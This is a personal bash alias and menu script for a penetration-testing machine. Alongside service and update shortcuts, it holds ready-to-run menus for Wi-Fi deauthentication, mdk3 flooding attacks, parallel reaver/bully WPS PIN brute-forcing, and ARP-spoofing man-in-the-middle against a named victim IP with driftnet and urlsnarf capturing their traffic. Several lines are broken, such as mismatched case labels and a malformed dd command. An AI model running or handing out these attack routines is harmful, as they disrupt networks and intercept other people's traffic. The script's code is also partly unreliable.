alias foo='echo !! >> foo.sh'
alias adbun='adb shell pm uninstall --user 0'
alias sap='sudo apt install'
alias ytdl='yt-dlp -f 'ba' -x --audio-format mp3 --yes-playlist'
alias ytdl_vid='yt-dlp'
alias chmod='sudo chmod +x'

# color varibles
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
# LOCAL IP VARIBLES:
ROUTER=192.168.2.1
# FUNCTIONS:
info() { printf $white"[INFO] $1\n" ; }
err() { printf $red"[ERROR] $1\n" ; }
##### Services
function services {
clear
echo -e "
\033[31m##########################################################\033[m
                 Services
\033[31m##########################################################\033[m"
select service in "Update Apt" "Dictionary" "Create Html File Of System Hardware" "Nmap Script Search" "Scan For Malware" "Start Local Web-server" "Start Network Services" "Stop Network Services" "Restart Network Services" "Start Apache Services" "Stop Apache Services" "Restart Apache Services" "Start Metasploit Services" "Stop Metasploit Services" "Restart Metasploit Services" "Autostart Metasploit Services" "Ip-Forward Start" "Ip-Forward Stop" "All System Info lshw.html on desktop" "Read Memory Strings" "View External IP" "Encrypt/Decrypt File" "ManPage 2 PDF" "Command Loop"; do
case $service in
	"Start Metasploit Services")
		echo -e "\033[32mStarting Metasploit Services..\033[m"
		service postgresql start && service metasploit start ;;
	
	"Stop Metasploit Services")
		echo -e "\033[32mStoping Metasploit Services..\033[m"
		service postgresql stop && service metasploit stop ;;
		
	"Restart Metasploit Services")
		echo -e "\033[32mRestarting Metasploit Services..\033[m"
		service postgresql restart && service metasploit restart ;;
		
	"Autostart Metasploit Services")
		echo -e "\033[32mSetting Metasploit Services to start on boot..\033[m"
		update-rc.d postgresql enable && update-rc.d metasploit enable ;;

	"Start Apache Services")
		echo -e "\033[32mStarting Apache Services..\033[m"
		service apache2 start ;;
	
	"Stop Apache Services")
		echo -e "\033[32mStoping Apache Services..\033[m"
		service apache2 stop ;;
		
	"Restart Apache Services")
		echo -e "\033[32mRestarting apache2 Services..\033[m"
		service apache2 restart ;;
		
	"Start  Network Services")
		echo -e "\033[32mStarting Network Services..\033[m"
		service NetworkManager start ;;
	
	"Stop Network Services")
		echo -e "\033[32mStoping Netwok Services..\033[m"
		service NetworkManager stop ;;
		
	"Restart Network Services")
		echo -e "\033[32mRestarting Network Services..\033[m"
		service NetworkManager restart ;;

	"Ip-Forward Start")
		echo 1 > /proc/sys/net/ipv4/ip_forward ;;

	
	"Ip-Forward Stop")
		echo 0 > /proc/sys/net/ipv4/ip_forward ;;

	"All System Info lshw.html on desktop")
		lshw -html > /root/Desktop/lshw.html ;;

	"View External IP")
		curl ifconfig.me ;;

	"Update Apt")
		apt update; apt dist-upgrade -y; apt autoremove -y; apt autoclean; apt clean; sh -c 'sync; echo 3 > /proc/sys/vm/drop_caches' && free && sync && echo 3 > /proc/sys/vm/drop_caches && free ;;

	"Scan For Malware")
		lynis audit system ;;

	"Nmap Script Search")
		read -p "nmap script searcher pattern/word?:" word; ls /usr/share/nmap/scripts/* | grep $word ;;

	"Start Local Web-server")
		python2 -m SimpleHTTPServer 8000 ;;

	"Create Html File Of System Hardware")
lshw -html hardware.html ;;

	"Encrypt/Decrypt File")
echo "e = encrypt d = decrypt:" && read e d && read -p "paste full path to file:" file
ccat -$e $file
ccat -$d $file 
		;;

	"Read Memory Strings")
dd if /dev/mem | cat | strings
		;;

	"ManPage 2 PDF")
read -p "enter what you want to make into pdf:" cmdtopdf; man -t $cmdtopdf | ps2pdf - $cmdtopdf.pdf
		;;

	"Command Loop")
echo "enter command to loop 100x"; read cmd; for i in {1..100}; do $cmd; done
		;;

	"Dictionary")
echo "enter word to lookup"; read word; curl dict://dict.org/d:$word
		;;

	*)
		
esac
break
done
}

#### wifi attack menu
wifi_attack() {
select wifi in "Set New Ip" "Set New Mac" "Start Airmon-ng" "Stop Airmon-ng" "Start Airodump-ng" "Deauth With Aireplay-ng" "Wps Router Pin Attack" "Mdk3_D" "Mdk3_A" "Mdk3_M" "Mdk3_W" "Mdk3_F" "Mdk3_G"; do
case $wifi in
	"Set New Ip")
read -p "setting new ip pick number for 192.168.2.urnumberhere:" num && ifconfig wlan0 192.168.2.$num/24
		 ;;
	
	"Set New Mac")
ifconfig wlan0 down; macchanger -r wlan0; ifconfig wlan0 up
		 ;;
		
	"Start Airmon-ng")
airmon-ng start wlan0; airmon-ng check kill
		 ;;

	"Stop Airmon-ng")
airmon-ng stop wlan0mon; service NetworkManager restart
		;;

	"Start Airodump-ng")
airodump-ng wlan0mon; service NetworkManager start; service NetworkManager restart
		;;

	"Deauth With Aireplay-ng")
echo "enter apmac-addr stmac-addr"; read apmac stmac; sudo aireplay-ng -0 0 -a $apmac -c $stmac wlan0mon
		;;

	"Mdk3_D")
airmon-ng start wlan0; clear; read -p "full path to blacklist file containing macaddress:" blacklist; mdk3 wlan0mon d -b $blacklist
		;;

	"Mdk3_A")
airmon-ng start wlan0; clear; read -p "target bssid:" bssid; mdk3 wlan0mon a -a $bssid
		;;

	"Mdk3_M")
airmon-ng start wlan0; clear; read -p "target bssid:" bssid; mdk3 wlan0mon m -t $bssid -w 1 -n 500 -j
		;;

	"Mdk3_W")
airmon-ng start wlan0; clear; read -p "target ssid:" ssid; mdk3 wlan0mon w -e $ssid -z
		;;

	"Mdk3_F")
airmon-ng start wlan0; clear; read -p "target bssid:" bssid; mdk3 wlan0mon f -t $bssid -f c4:ac:59:08:d2:b9
		;;

	"Mdk3_G")
airmon-ng start wlan0; clear; read -p "target bssid:" bssid; mdk3 wlan0mon g -t $bssid
		;;

	"Wps Router Pin Attack")
echo -e $green "enter (targetmac) (channel)"
read mac ch
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -b -f -N -L -d 2 -vvroot; bash" &
xterm -e bash -c "sudo bully wlan0mon -b $mac -c $ch -S -F -B -v 3; bash" &
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -K 1 -N -vv; bash" &
xterm -e bash -c "sudo bully wlan0mon -b $mac -d -v 3; bash" &
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -f -N -g 1 -vv -p ''; bash"
		;;

	*)
						
esac
break
done
}
function scan {
clear
echo -e "
\033[31m##########################################################\033[m
			LOCAL NETWORK & PORTSCANNING & WEB SCANNING
\033[31m##########################################################\033[m"
select sl in "Mitm Spoof" "Scan localnet [arp-scan]" "Scan localnet [netdiscover]" "Scan Nearby Wifi's" "Monitor Open ports" "Get Ip From Website" "Port Scan Target"; do
case $sl in
	"Mitm Spoof")
sysctl -w net.ipv4.ip_forward=1
read -p "enter victem-ip router-ip" vicip routerip
xterm -e bash -c "arpspoof -i wlan0 -t $vicip $routerip; bash" &
xterm -e bash -c "arpspoof -i wlan0 -t $routerip $vicip; bash" &
xterm -e bash -c "driftnet -i wlan0; bash" &
xterm -e bash -c "urlsnarf -i wlan0; bash"
		 ;;
	
	"Scan localnet [arp-scan]")
watch arp-scan --localnet
		 ;;
		
	"Scan localnet [netdiscover]")
netdiscover -p -r 192.168.2.1/24
		 ;;
		
	"Scan Nearby Wifi's")
iw dev wlan0 scan | grep '^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA'
		 ;;

	"Monitor Open ports")
watch netstat -nutlp
		;;

	"Get Ip From Website")
read -p "web url to scan for ip:" weburl; echo $(wget -qO - $weburl)
		;;

	"Port Scan Target")
echo "enter target ip"; read IP; masscan -p1-65535,U:1-65535 $IP --rate=1000 -e wlan0
		;;

		
	*)		
		
esac
break
done
}

function mainmenu {
clear
echo -e "
\033[31m##########################################################\033[m
			LOCAL NETWORK & PORTSCANNING & WEB SCANNING
\033[31m##########################################################\033[m"
select main in "Services" "Local,Port,And Web Scanning,Mitm" "Wifi Attack's"; do
case $main in
	"Services")
clear
services
		 ;;
	
	"Local,Port,And Web Scanning")
clear
scan
		 ;;
		
	"Wifi Attack's")
clear
wifi_attack
		 ;;
		
	*)		
		
esac
break
done
}
